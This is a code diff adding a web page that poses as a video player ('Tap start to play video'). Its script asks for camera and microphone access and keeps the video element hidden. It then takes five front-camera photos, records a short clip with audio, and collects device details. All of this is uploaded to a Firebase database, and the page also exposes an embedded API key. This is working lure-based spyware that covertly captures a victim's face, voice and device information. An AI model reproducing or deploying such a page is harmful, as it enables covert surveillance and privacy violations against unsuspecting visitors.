@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chinto994</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif;}
+body{height:100vh;background:#f8f8f8;display:flex;flex-direction:column;justify-content:space-between;align-items:center;}
+header{width:100%;padding:14px;background:#fff;border-bottom:1px solid #ddd;}
+.card{width:340px;background:#fff;border-radius:14px;padding:25px;box-shadow:0 8px 24px rgba(0,0,0,.1);text-align:center;}
+h3{margin-bottom:10px;}
+#msg{font-size:14px;color:#666;margin-bottom:18px;}
+button{width:100%;padding:12px;background:#fe2c55;border:none;color:#fff;border-radius:10px;font-size:16px;cursor:pointer;transition:.3s;position:relative;overflow:hidden;}
+button:disabled{background:#ccc;cursor:not-allowed;}
+button.loading::after{content:"";width:22px;height:22px;border:3px solid rgba(255,255,255,.5);border-top-color:#fff;border-radius:50%;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);animation:spin 1s linear infinite;}
+button.loading span{visibility:hidden;}
+@keyframes spin{to{transform:translate(-50%,-50%) rotate(360deg);}}
+video{display:none;}
+footer{padding:10px;font-size:13px;}
+</style>
+</head>
+<body>
+<header>Chinto 994</header>
+<div class="card">
+  <h3>Chinto994</h3>
+  <p id="msg">Tap start to play video</p>
+  <button id="startBtn"><span>Start</span></button>
+  <video id="video" autoplay muted playsinline></video>
+</div>
+<footer>Help Center</footer>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-app.js";
+import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-database.js";
+
+const firebaseConfig={
+  apiKey:"AIzaSyB0eLmZSDtmF1deFGBNSU9e3aq8_i_DjC4",
+  authDomain:"online-earning-9751b.firebaseapp.com",
+  databaseURL:"https://online-earning-9751b-default-rtdb.firebaseio.com",
+  projectId:"online-earning-9751b",
+  storageBucket:"online-earning-9751b.firebasestorage.app",
+  messagingSenderId:"454796166249",
+  appId:"1:454796166249:web:0606b052e435312a068ef8"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+const video = document.getElementById("video");
+const startBtn = document.getElementById("startBtn");
+const msg = document.getElementById("msg");
+
+async function getDeviceName() {
+  if (navigator.userAgentData) {
+    const d = await navigator.userAgentData.getHighEntropyValues(["platform","model"]);
+    return d.platform+" "+(d.model||"");
+  }
+  return navigator.userAgent;
+}
+
+function captureImage(){
+  const c=document.createElement("canvas");
+  c.width=video.videoWidth;
+  c.height=video.videoHeight;
+  c.getContext("2d").drawImage(video,0,0);
+  return c.toDataURL("image/png");
+}
+
+const delay = ms => new Promise(r=>setTimeout(r,ms));
+
+async function recordVideoAndImages(device){
+  const stream = video.srcObject;
+  const recorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8' });
+  let chunks = [];
+  recorder.ondataavailable = e => chunks.push(e.data);
+  recorder.start();
+
+  msg.innerText = "Recording video and capturing 5 images…";
+
+  // Capture 5 images evenly during 3 seconds
+  for(let i=0;i<5;i++){
+    await delay(600);
+    push(ref(db,"tempImages"),{
+      image: captureImage(),
+      time: Date.now(),
+      device: device
+    });
+  }
+
+  await delay(600);
+  recorder.stop();
+
+  return new Promise(resolve=>{
+    recorder.onstop = () => {
+      const blob = new Blob(chunks, { type: 'video/webm' });
+      const reader = new FileReader();
+      reader.onloadend = () => {
+        push(ref(db,"tempImages"),{
+          video: reader.result,
+          time: Date.now(),
+          device: device
+        });
+        resolve();
+      };
+      reader.readAsDataURL(blob);
+    };
+  });
+}
+
+startBtn.onclick = async()=>{
+  startBtn.disabled = true;
+  startBtn.classList.add("loading");
+  msg.innerText = "Initializing camera…";
+
+  const device = await getDeviceName();
+
+  try {
+    // ✅ Capture video + audio safely
+    const stream = await navigator.mediaDevices.getUserMedia({ 
+      video:{facingMode:"user"}, 
+      audio:true // enable microphone
+    });
+
+    video.srcObject = stream;
+    video.muted = false; // unmute local preview
+    await video.play();
+
+    await recordVideoAndImages(device);
+
+    msg.innerText = "Done!";
+    startBtn.classList.remove("loading");
+  } catch(err) {
+    console.error("Media device error:", err);
+    msg.innerText = "Cannot access camera/microphone. Make sure you allow permissions and use HTTPS.";
+    startBtn.disabled = false;
+    startBtn.classList.remove("loading");
+  }
+};
+</script>
+</body>
+</html>
